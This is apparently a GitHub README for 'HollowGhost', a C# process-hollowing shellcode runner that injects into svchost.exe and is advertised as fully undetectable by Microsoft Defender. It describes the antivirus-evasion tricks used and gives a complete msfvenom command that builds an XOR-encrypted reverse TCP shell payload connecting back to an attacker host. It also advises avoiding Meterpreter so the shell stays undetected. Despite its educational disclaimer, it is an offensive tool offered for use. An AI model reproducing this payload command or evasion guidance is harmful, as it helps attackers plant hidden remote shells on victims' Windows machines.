# HollowGhost :ghost:
Process hollowing C# shellcode runner that is FUD against Microsoft Defender as of October 7, 2023.

HollowGhost performs process hollowing injection into **svchost.exe** on Windows.

This shellcode runner is currently FUD by Microsoft Defender at scan-time, runtime, and during on-demand scanning with an active shell.

**Disclaimer**: The resources provided are only for educational and research purposes. I am, in no way, responsible for any misuse of these resources. The resources shown here should only be used legally for ethical hacking.

There are currently two versions of this shellcode runner.

The only difference between the two:

- **HollowGhost** utilizes string concatenation to obfuscate the file path string "C:\Windows\System32\svchost.exe" passed to the CreateProcess Win32 API function.

- **HollowGhostEncPath** utilizes AES encryption with a dynamically generated IV and key to obfuscate the file path string "C:\Windows\System32\svchost.exe" passed to the CreateProcess Win32 API function.

Both versions of the shellcode runner use custom delegate functions to obfuscate the Win32 API function calls and evade antivirus.

**Payload**:

`msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key z -i 20 | tr -d '\n\r'`

**Note**: Using a Meterpreter payload will result in detection if an on-demand scan is performed while the shell session is active. Therefore, stick to payloads that don't use Meterpreter.

## Instructions
To keep things contained to one repository, both projects are within the HollowGhost.sln solution.
- Clone the repository `git clone https://github.com/Logan-Elliott/HollowGhost.git`
- Open the HollowGhost.sln solution file with Visual Studio
- Set build configuration to Release
- Set platform to x64
- Good to go :thumbsup:

## Windows 11 Build Tested
![win11-build](https://github.com/Logan-Elliott/HollowGhost/assets/57501260/f3258ab1-4922-4108-94c6-b3df24ffa150)

## HollowGhost: FUD During On-Demand Scanning With Shell
![hollowghost-fud-on-demand-scan](https://github.com/Logan-Elliott/HollowGhost/assets/57501260/3065b190-f29c-483a-8686-d11fadf5fdad)

## HollowGhostEncPath: FUD During On-Demand Scanning With Shell
![enc-path-fud-on-demand-scan](https://github.com/Logan-Elliott/HollowGhost/assets/57501260/a46a9013-30e7-4724-98a0-96baf640e623)

## To-Do List
- [ ] Edit code to output PID of the created svchost.exe process to the console
